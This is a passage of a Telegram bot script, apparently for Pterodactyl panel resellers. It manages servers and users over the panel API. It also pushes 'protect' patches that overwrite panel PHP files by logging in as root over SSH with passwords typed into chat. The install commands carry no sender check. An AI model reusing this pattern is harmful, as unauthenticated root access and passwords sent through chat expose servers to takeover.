      `✅ SUKSES MENGHAPUS:\n${successList.map((v,i)=>`${i+1}. ${v}`).join("\n")}`,
      { chat_id: chatId, message_id: sentMsg.message_id }
    );

  } catch (e) {
    bot.sendMessage(chatId, `❌ Error: ${e.message}`);
  }
});

bot.onText(/^\/listsrvoff$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const res = await fetch(`${domain}/api/application/servers?per_page=100`, {
      headers: {
        Accept: "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });

    const data = await res.json();

    if (!data.data || data.data.length === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada server di panel.");
    }

    const off = [];

    for (const srv of data.data) {
      const uuid = srv.attributes.uuid;

      const st = await fetch(`${domain}/api/client/servers/${uuid}/resources`, {
        headers: {
          Accept: "application/json",
          Authorization: `Bearer ${pltc}`,
        },
      });

      const sd = await st.json();

      if (sd.attributes.current_state === "offline") {
        off.push(`• ${srv.attributes.name} (ID: ${srv.attributes.id})`);
      }
    }

    if (off.length === 0) {
      return bot.sendMessage(chatId, "✅ Semua server dalam keadaan ONLINE.");
    }

    bot.sendMessage(
      chatId,
      `┏━⬣ ✧「 SERVER OFFLINE 」✧
┃ ${off.join("\n")}
┗━━━━━━━━━━━━━━━━━━⬣`
    );
  } catch (e) {
    bot.sendMessage(chatId, `❌ Error: ${e.message}`);
  }
});

bot.onText(/^\/listsrvoffv2$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const res = await fetch(`${domainv2}/api/application/servers?per_page=100`, {
      headers: {
        Accept: "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
    });

    const data = await res.json();

    if (!data.data || data.data.length === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada server di panel.");
    }

    const off = [];

    for (const srv of data.data) {
      const uuid = srv.attributes.uuid;

      const st = await fetch(`${domainv2}/api/client/servers/${uuid}/resources`, {
        headers: {
          Accept: "application/json",
          Authorization: `Bearer ${pltcv2}`,
        },
      });

      const sd = await st.json();

      if (sd.attributes.current_state === "offline") {
        off.push(`• ${srv.attributes.name} (ID: ${srv.attributes.id})`);
      }
    }

    if (off.length === 0) {
      return bot.sendMessage(chatId, "✅ Semua server dalam keadaan ONLINE.");
    }

    bot.sendMessage(
      chatId,
`┏━⬣ ✧「 SERVER OFFLINE 」✧
┃ ${off.join("\n")}
┗━━━━━━━━━━━━━━━━━━⬣`
    );
  } catch (e) {
    bot.sendMessage(chatId, `❌ Error: ${e.message}`);
  }
});

// ================== LIST ADMIN ==================
bot.onText(/\/listadmin$/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak.");
  }

  const adminData = readAdminData();
  if (Object.keys(adminData).length === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada admin.");
  }

  let text = "┏━⬣ ✧「 LIST ADMIN 」✧\n";
  let no = 1;

  for (const key in adminData) {
    const a = adminData[key];
    text += `┃ ${no}. ${a.username} | ID: ${a.userId}\n`;
    no++;
  }

  text += "┗━━━━━━━━━━━━━━━━━━⬣";
  bot.sendMessage(chatId, text);
});
// =======================================================


// ================== LIST USER PANEL ==================
bot.onText(/\/listuser$/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak.");
  }

  const panelData = readPanelData();
  if (Object.keys(panelData).length === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada user panel.");
  }

  let text = "┏━⬣ ✧「 LIST USER PANEL 」✧\n";
  let no = 1;

  for (const key in panelData) {
    const u = panelData[key];
    text += `┃ ${no}. ${u.username} | ID: ${u.userId}\n`;
    no++;
  }

  text += "┗━━━━━━━━━━━━━━━━━━⬣";
  bot.sendMessage(chatId, text);
});
// =======================================================


// ================== DELETE ADMIN (PANEL + JSON) ==================
bot.onText(/\/deladmin (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = match[1].trim();

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak.");
  }

  const adminData = readAdminData();
  const admin = adminData[username];

  if (!admin) {
    return bot.sendMessage(chatId, "❌ Admin tidak ditemukan.");
  }

  try {
    await fetch(`${domainv2}/api/application/users/${admin.userId}`, {
      method: "DELETE",
      headers: {
        Authorization: `Bearer ${pltav2}`,
        Accept: "application/json",
      },
    });

    delete adminData[username];
    saveAdminData(adminData);

    bot.sendMessage(
      chatId,
      `✅ Admin ${username} berhasil dihapus (panel + JSON)`
    );
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Gagal menghapus admin.");
  }
});
// =======================================================


// ================== DELETE USER (SERVER + PANEL + JSON) ==================
bot.onText(/\/deluser (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = match[1].trim();

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak.");
  }

  const panelData = readPanelData();
  const user = panelData[username];

  if (!user) {
    return bot.sendMessage(chatId, "❌ User tidak ditemukan.");
  }

  try {
    // Ambil server user
    const res = await fetch(
      `${domain}/api/application/users/${user.userId}?include=servers`,
      {
        headers: {
          Authorization: `Bearer ${plta}`,
          Accept: "application/json",
        },
      }
    );

    const data = await res.json();
    const servers = data.attributes.relationships.servers.data;

    // Hapus semua server
    for (const srv of servers) {
      await fetch(`${domain}/api/application/servers/${srv.attributes.id}`, {
        method: "DELETE",
        headers: {
          Authorization: `Bearer ${plta}`,
          Accept: "application/json",
        },
      });
    }

    // Hapus user panel
    await fetch(`${domain}/api/application/users/${user.userId}`, {
      method: "DELETE",
      headers: {
        Authorization: `Bearer ${plta}`,
        Accept: "application/json",
      },
    });

    delete panelData[username];
    savePanelData(panelData);

    bot.sendMessage(
      chatId,
      `✅ User ${username} berhasil dihapus (server + panel + JSON)`
    );
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Gagal menghapus user.");
  }
});
// =======================================================
let sessions = {};
// FITUR PROTECT PANEL
bot.onText(/^\/installprotect1 (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const input = match[1];

  // ===============================
  // 🔐 VALIDASI OWNER / ADMIN
  // ===============================
 
  // Validasi format input
  if (!input.includes('|')) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect1 ipvps|pwvps`', { parse_mode: 'Markdown' });
  }

  const [ipvps, pwvps] = input.split('|').map(i => i.trim());
  if (!ipvps || !pwvps) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect1 ipvps|pwvps`', { parse_mode: 'Markdown' });
  }

  const filePath = "/var/www/pterodactyl/resources/views/layouts/admin.blade.php";

  const phpCode = `<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>{{ config('app.name', 'Pterodactyl') }} - @yield('title')</title>
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
        <meta name="_token" content="{{ csrf_token() }}">

        <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
        <link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
        <link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
        <link rel="manifest" href="/favicons/manifest.json">
        <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#bc6e3c">
        <link rel="shortcut icon" href="/favicons/favicon.ico">
        <meta name="msapplication-config" content="/favicons/browserconfig.xml">
        <meta name="theme-color" content="#0e4688">

        @include('layouts.scripts')

        @section('scripts')
            {!! Theme::css('vendor/select2/select2.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/bootstrap/bootstrap.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/admin.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/colors/skin-blue.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/sweetalert/sweetalert.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/animate/animate.min.css?t={cache-version}') !!}
            {!! Theme::css('css/pterodactyl.css?t={cache-version}') !!}
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">

            <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
            <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
            <![endif]-->
        @show
    </head>
    <body class="hold-transition skin-blue fixed sidebar-mini">
        <div class="wrapper">
            <header class="main-header">
                <a href="{{ route('index') }}" class="logo">
                    <span>{{ config('app.name', 'Pterodactyl') }}</span>
                </a>
                <nav class="navbar navbar-static-top">
                    <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </a>
                    <div class="navbar-custom-menu">
                        <ul class="nav navbar-nav">
                            <li class="user-menu">
                                <a href="{{ route('account') }}">
                                    <img src="https://www.gravatar.com/avatar/{{ md5(strtolower(Auth::user()->email)) }}?s=160" class="user-image" alt="User Image">
                                    <span class="hidden-xs">{{ Auth::user()->name_first }} {{ Auth::user()->name_last }}</span>
                                </a>
                            </li>
                            <li>
                                <li><a href="{{ route('index') }}" data-toggle="tooltip" data-placement="bottom" title="Exit Admin Control"><i class="fa fa-server"></i></a></li>
                            </li>
                            <li>
                                <li><a href="{{ route('auth.logout') }}" id="logoutButton" data-toggle="tooltip" data-placement="bottom" title="Logout"><i class="fa fa-sign-out"></i></a></li>
                            </li>
                        </ul>
                    </div>
                </nav>
            </header>
            <aside class="main-sidebar">
                <section class="sidebar">
                    <ul class="sidebar-menu">
                        <li class="header">BASIC ADMINISTRATION</li>
                        <li class="{{ Route::currentRouteName() !== 'admin.index' ?: 'active' }}">
                            <a href="{{ route('admin.index') }}">
                                <i class="fa fa-home"></i> <span>Overview</span>
                            </a>
                        </li>
{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.settings') ?: 'active' }}">
    <a href="{{ route('admin.settings') }}">
        <i class="fa fa-wrench"></i> <span>Settings</span>
    </a>
</li>
@endif
{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.api') ?: 'active' }}">
    <a href="{{ route('admin.api.index')}}">
        <i class="fa fa-gamepad"></i> <span>Application API</span>
    </a>
</li>
@endif
<li class="header">MANAGEMENT</li>

{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.databases') ?: 'active' }}">
    <a href="{{ route('admin.databases') }}">
        <i class="fa fa-database"></i> <span>Databases</span>
    </a>
</li>
@endif

{{-- ✅ Hanya tampil untuk user ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.locations') ?: 'active' }}">
    <a href="{{ route('admin.locations') }}">
        <i class="fa fa-globe"></i> <span>Locations</span>
    </a>
</li>
@endif

{{-- ✅ Hanya tampil untuk user dengan ID 1 --}}
@if(Auth::user()->id == 1)
<li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nodes') ?: 'active' }}">
    <a href="{{ route('admin.nodes') }}">
        <i class="fa fa-sitemap"></i> <span>Nodes</span>
    </a>
</li>
@endif

                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.servers') ?: 'active' }}">
                            <a href="{{ route('admin.servers') }}">
                                <i class="fa fa-server"></i> <span>Servers</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.users') ?: 'active' }}">
                            <a href="{{ route('admin.users') }}">
                                <i class="fa fa-users"></i> <span>Users</span>
                            </a>
                        </li>
{{-- ✅ Hanya tampil untuk admin utama --}}
@if(Auth::user()->id == 1)
    <li class="header">SERVICE MANAGEMENT</li>

    <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.mounts') ?: 'active' }}">
        <a href="{{ route('admin.mounts') }}">
            <i class="fa fa-magic"></i> <span>Mounts</span>
        </a>
    </li>

    <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nests') ?: 'active' }}">
        <a href="{{ route('admin.nests') }}">
            <i class="fa fa-th-large"></i> <span>Nests</span>
        </a>
    </li>
@endif
                    </ul>
                </section>
            </aside>
            <div class="content-wrapper">
                <section class="content-header">
                    @yield('content-header')
                </section>
                <section class="content">
                    <div class="row">
                        <div class="col-xs-12">
                            @if (count($errors) > 0)
                                <div class="alert alert-danger">
                                    There was an error validating the data provided.<br><br>
                                    <ul>
                                        @foreach ($errors->all() as $error)
                                            <li>{{ $error }}</li>
                                        @endforeach
                                    </ul>
                                </div>
                            @endif
                            @foreach (Alert::getMessages() as $type => $messages)
                                @foreach ($messages as $message)
                                    <div class="alert alert-{{ $type }} alert-dismissable" role="alert">
                                        {!! $message !!}
                                    </div>
                                @endforeach
                            @endforeach
                        </div>
                    </div>
                    @yield('content')
                </section>
            </div>
            <footer class="main-footer">
                <div class="pull-right small text-gray" style="margin-right:10px;margin-top:-7px;">
                    <strong><i class="fa fa-fw {{ $appIsGit ? 'fa-git-square' : 'fa-code-fork' }}"></i></strong> {{ $appVersion }}<br />
                    <strong><i class="fa fa-fw fa-clock-o"></i></strong> {{ round(microtime(true) - LARAVEL_START, 3) }}s
                </div>
                Copyright &copy; 2015 - {{ date('Y') }} <a href="https://pterodactyl.io/">Pterodactyl Software</a>.
            </footer>
        </div>
        @section('footer-scripts')
            <script src="/js/keyboard.polyfill.js" type="application/javascript"></script>
            <script>keyboardeventKeyPolyfill.polyfill();</script>

            {!! Theme::js('vendor/jquery/jquery.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/sweetalert/sweetalert.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap/bootstrap.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/slimscroll/jquery.slimscroll.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/adminlte/app.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap-notify/bootstrap-notify.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/select2/select2.full.min.js?t={cache-version}') !!}
            {!! Theme::js('js/admin/functions.js?t={cache-version}') !!}
            <script src="/js/autocomplete.js" type="application/javascript"></script>

            @if(Auth::user()->root_admin)
                <script>
                    $('#logoutButton').on('click', function (event) {
                        event.preventDefault();

                        var that = this;
                        swal({
                            title: 'Do you want to log out?',
                            type: 'warning',
                            showCancelButton: true,
                            confirmButtonColor: '#d9534f',
                            cancelButtonColor: '#d33',
                            confirmButtonText: 'Log out'
                        }, function () {
                             $.ajax({
                                type: 'POST',
                                url: '{{ route('auth.logout') }}',
                                data: {
                                    _token: '{{ csrf_token() }}'
                                },complete: function () {
                                    window.location.href = '{{route('auth.login')}}';
                                }
                        });
                    });
                });
                </script>
            @endif

            <script>
                $(function () {
                    $('[data-toggle="tooltip"]').tooltip();
                })
            </script>
        @show
    </body>
</html>`.trim();

  // ===============================
  // 🚀 EKSEKUSI SSH
  // ===============================
  bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* ...`, { parse_mode: "Markdown" });

  try {
    await ssh.connect({
      host: ipvps,
      username: "root",
      password: pwvps,
      port: 22,
    });

    const tempFile = path.join(__dirname, "admin.blade.php");
    fs.writeFileSync(tempFile, phpCode);

    await ssh.putFile(tempFile, filePath);
    fs.unlinkSync(tempFile);

    ssh.dispose();

    bot.sendMessage(
      chatId,
`🛡️ *PROTECT BERHASIL DIPASANG*

🚫 Menu admin disembunyikan total
👑 Hanya User ID 1 yang melihat menu penuh
🔐 Aman dari reseller / user nakal

📂 File:
\`${filePath}\`

© By pirzy`,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    bot.sendMessage(
      chatId,
      `❌ Gagal install PROTECT1\n\nError:\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  }
});
bot.onText(/^\/installprotect2 (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const input = match[1];

  // ✅ Validasi owner saja
  
  // Validasi format input ipvps|password
  if (!input.includes('|')) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect8 ipvps|password`', { parse_mode: 'Markdown' });
  }

  const [ipvps, password] = input.split('|').map(i => i.trim());
  if (!ipvps || !password) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect2 ipvps|password`', { parse_mode: 'Markdown' });
  }

  const filePath =
    "/var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/ServerController.php";

  const phpCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client\\Servers;

use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Transformers\\Api\\Client\\ServerTransformer;
use Pterodactyl\\Services\\Servers\\GetUserPermissionsService;
use Pterodactyl\\Http\\Controllers\\Api\\Client\\ClientApiController;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\GetServerRequest;

class ServerController extends ClientApiController
{
    public function __construct(private GetUserPermissionsService $permissionsService)
    {
        parent::__construct();
    }

    /**
     * 🧱 NDy Anti-Intip Server Protect v2.5
     * Hanya Admin utama (ID 1) atau pemilik server yang dapat melihat detail server.
     */
    public function index(GetServerRequest $request, Server $server): array
    {
        $authUser = Auth::user();

        if (!$authUser) {
            abort(403, '🚫 Tidak dapat memverifikasi pengguna. Silakan login ulang.');
        }

        if ($authUser->id !== 1 && (int) $server->owner_id !== (int) $authUser->id) {
            abort(403, '❌ GAGAL MENGINTIP SERVER ORANG SILAHKAN KEMBALI KE SERVER SENDIRI');
        }

        return $this->fractal->item($server)
            ->transformWith($this->getTransformer(ServerTransformer::class))
            ->addMeta([
                'is_server_owner' => $authUser->id === $server->owner_id,
                'user_permissions' => $this->permissionsService->handle($server, $authUser),
            ])
            ->toArray();
    }
}`.trim();

  try {
    await ssh.connect({
      host: ipvps,
      username: 'root',
      password: password,
      port: 22,
    });

    const tempFile = path.join(__dirname, "ServerController.php");
    fs.writeFileSync(tempFile, phpCode);

    await ssh.putFile(tempFile, filePath);
    fs.unlinkSync(tempFile);

    await bot.sendMessage(
      chatId,
      `🛡️ *PROTECT2 (ANTI INTIP SERVER) BERHASIL DIPASANG!*

⚙️ *Fungsi:*  
Mencegah user melihat detail server orang lain (*anti intip*).

🔐 Hanya *Admin ID 1 & Owner server* yang dapat membuka halaman Server.  
🚫 User lain otomatis *403 Forbidden*.

📂 *Lokasi File:*  
\`${filePath}\`

©Protect By @Pirzyy1`,
      { parse_mode: "Markdown" }
    );

    ssh.dispose();
    console.log(`🟢 Protect2 aktif untuk owner ${userId} di VPS ${ipvps}`);
  } catch (err) {
    console.error("❌ ERROR INSTALLPROTECT2:", err);
    bot.sendMessage(
      chatId,
      `❌ Gagal memasang PROTECT2.\n\nError:\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  }
});
/// Fitur Unprotect Panel
bot.onText(/^\/uninstallprotect1 (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const input = match[1];

  // Validasi premium
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }
  // Validasi format input
  if (!input.includes('|')) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect1 ipvps|pwvps`', { parse_mode: 'Markdown' });
  }

  const [ipvps, pwvps] = input.split('|').map(i => i.trim());
  if (!ipvps || !pwvps) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/installprotect1 ipvps|pwvps`', { parse_mode: 'Markdown' });
  }

  const filePath = "/var/www/pterodactyl/resources/views/layouts/admin.blade.php";

  // 📂 FULL DEFAULT ADMIN.BLADE.PHP
  const phpCode = `<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>{{ config('app.name', 'Pterodactyl') }} - @yield('title')</title>
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
        <meta name="_token" content="{{ csrf_token() }}">

        <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
        <link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
        <link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
        <link rel="manifest" href="/favicons/manifest.json">
        <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#bc6e3c">
        <link rel="shortcut icon" href="/favicons/favicon.ico">
        <meta name="msapplication-config" content="/favicons/browserconfig.xml">
        <meta name="theme-color" content="#0e4688">

        @include('layouts.scripts')

        @section('scripts')
            {!! Theme::css('vendor/select2/select2.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/bootstrap/bootstrap.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/admin.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/colors/skin-blue.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/sweetalert/sweetalert.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/animate/animate.min.css?t={cache-version}') !!}
            {!! Theme::css('css/pterodactyl.css?t={cache-version}') !!}
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">

            <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
            <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
            <![endif]-->
        @show
    </head>
    <body class="hold-transition skin-blue fixed sidebar-mini">
        <div class="wrapper">
            <header class="main-header">
                <a href="{{ route('index') }}" class="logo">
                    <span>{{ config('app.name', 'Pterodactyl') }}</span>
                </a>
                <nav class="navbar navbar-static-top">
                    <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </a>
                    <div class="navbar-custom-menu">
                        <ul class="nav navbar-nav">
                            <li class="user-menu">
                                <a href="{{ route('account') }}">
                                    <img src="https://www.gravatar.com/avatar/{{ md5(strtolower(Auth::user()->email)) }}?s=160" class="user-image" alt="User Image">
                                    <span class="hidden-xs">{{ Auth::user()->name_first }} {{ Auth::user()->name_last }}</span>
                                </a>
                            </li>
                            <li>
                                <li><a href="{{ route('index') }}" data-toggle="tooltip" data-placement="bottom" title="Exit Admin Control"><i class="fa fa-server"></i></a></li>
                            </li>
                            <li>
                                <li><a href="{{ route('auth.logout') }}" id="logoutButton" data-toggle="tooltip" data-placement="bottom" title="Logout"><i class="fa fa-sign-out"></i></a></li>
                            </li>
                        </ul>
                    </div>
                </nav>
            </header>
            <aside class="main-sidebar">
                <section class="sidebar">
                    <ul class="sidebar-menu">
                        <li class="header">BASIC ADMINISTRATION</li>
                        <li class="{{ Route::currentRouteName() !== 'admin.index' ?: 'active' }}">
                            <a href="{{ route('admin.index') }}">
                                <i class="fa fa-home"></i> <span>Overview</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.settings') ?: 'active' }}">
                            <a href="{{ route('admin.settings')}}">
                                <i class="fa fa-wrench"></i> <span>Settings</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.api') ?: 'active' }}">
                            <a href="{{ route('admin.api.index')}}">
                                <i class="fa fa-gamepad"></i> <span>Application API</span>
                            </a>
                        </li>
                        <li class="header">MANAGEMENT</li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.databases') ?: 'active' }}">
                            <a href="{{ route('admin.databases') }}">
                                <i class="fa fa-database"></i> <span>Databases</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.locations') ?: 'active' }}">
                            <a href="{{ route('admin.locations') }}">
                                <i class="fa fa-globe"></i> <span>Locations</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nodes') ?: 'active' }}">
                            <a href="{{ route('admin.nodes') }}">
                                <i class="fa fa-sitemap"></i> <span>Nodes</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.servers') ?: 'active' }}">
                            <a href="{{ route('admin.servers') }}">
                                <i class="fa fa-server"></i> <span>Servers</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.users') ?: 'active' }}">
                            <a href="{{ route('admin.users') }}">
                                <i class="fa fa-users"></i> <span>Users</span>
                            </a>
                        </li>
                        <li class="header">SERVICE MANAGEMENT</li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.mounts') ?: 'active' }}">
                            <a href="{{ route('admin.mounts') }}">
                                <i class="fa fa-magic"></i> <span>Mounts</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nests') ?: 'active' }}">
                            <a href="{{ route('admin.nests') }}">
                                <i class="fa fa-th-large"></i> <span>Nests</span>
                            </a>
                        </li>
                    </ul>
                </section>
            </aside>
            <div class="content-wrapper">
                <section class="content-header">
                    @yield('content-header')
                </section>
                <section class="content">
                    <div class="row">
                        <div class="col-xs-12">
                            @if (count($errors) > 0)
                                <div class="alert alert-danger">
                                    There was an error validating the data provided.<br><br>
                                    <ul>
                                        @foreach ($errors->all() as $error)
                                            <li>{{ $error }}</li>
                                        @endforeach
                                    </ul>
                                </div>
                            @endif
                            @foreach (Alert::getMessages() as $type => $messages)
                                @foreach ($messages as $message)
                                    <div class="alert alert-{{ $type }} alert-dismissable" role="alert">
                                        {!! $message !!}
                                    </div>
                                @endforeach
                            @endforeach
                        </div>
                    </div>
                    @yield('content')
                </section>
            </div>
            <footer class="main-footer">
                <div class="pull-right small text-gray" style="margin-right:10px;margin-top:-7px;">
                    <strong><i class="fa fa-fw {{ $appIsGit ? 'fa-git-square' : 'fa-code-fork' }}"></i></strong> {{ $appVersion }}<br />
                    <strong><i class="fa fa-fw fa-clock-o"></i></strong> {{ round(microtime(true) - LARAVEL_START, 3) }}s
                </div>
                Copyright &copy; 2015 - {{ date('Y') }} <a href="https://pterodactyl.io/">Pterodactyl Software</a>.
            </footer>
        </div>
        @section('footer-scripts')
            <script src="/js/keyboard.polyfill.js" type="application/javascript"></script>
            <script>keyboardeventKeyPolyfill.polyfill();</script>

            {!! Theme::js('vendor/jquery/jquery.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/sweetalert/sweetalert.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap/bootstrap.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/slimscroll/jquery.slimscroll.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/adminlte/app.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap-notify/bootstrap-notify.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/select2/select2.full.min.js?t={cache-version}') !!}
            {!! Theme::js('js/admin/functions.js?t={cache-version}') !!}
            <script src="/js/autocomplete.js" type="application/javascript"></script>

            @if(Auth::user()->root_admin)
                <script>
                    $('#logoutButton').on('click', function (event) {
                        event.preventDefault();

                        var that = this;
                        swal({
                            title: 'Do you want to log out?',
                            type: 'warning',
                            showCancelButton: true,
                            confirmButtonColor: '#d9534f',
                            cancelButtonColor: '#d33',
                            confirmButtonText: 'Log out'
                        }, function () {
                             $.ajax({
                                type: 'POST',
                                url: '{{ route('auth.logout') }}',
                                data: {
                                    _token: '{{ csrf_token() }}'
                                },complete: function () {
                                    window.location.href = '{{route('auth.login')}}';
                                }
                        });
                    });
                });
                </script>
            @endif

            <script>
                $(function () {
                    $('[data-toggle="tooltip"]').tooltip();
                })
            </script>
        @show
    </body>
</html>
`.trim();

  // 🚀 EKSEKUSI SSH
  bot.sendMessage(chatId, `⏳ Menghubungkan ke VPS *${ipvps}* ...`, { parse_mode: "Markdown" });

  try {
    await ssh.connect({
      host: ipvps,
      username: "root",
      password: pwvps,
      port: 22,
    });

    const tempFile = path.join(__dirname, "admin.blade.php");
    fs.writeFileSync(tempFile, phpCode);

    await ssh.putFile(tempFile, filePath);
    fs.unlinkSync(tempFile);

    ssh.dispose();

    bot.sendMessage(
      chatId,
      `✅ *UNINSTALL PROTECT1 BERHASIL!*

📂 File dikembalikan ke versi default:
\`${filePath}\`

© By pirzy`,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    bot.sendMessage(
      chatId,
      `❌ Gagal uninstall PROTECT14\n\nError:\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/uninstallprotect2 (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const input = match[1];

  // ✅ Validasi owner saja
  if (String(userId) !== String(config.OWNER_ID)) {
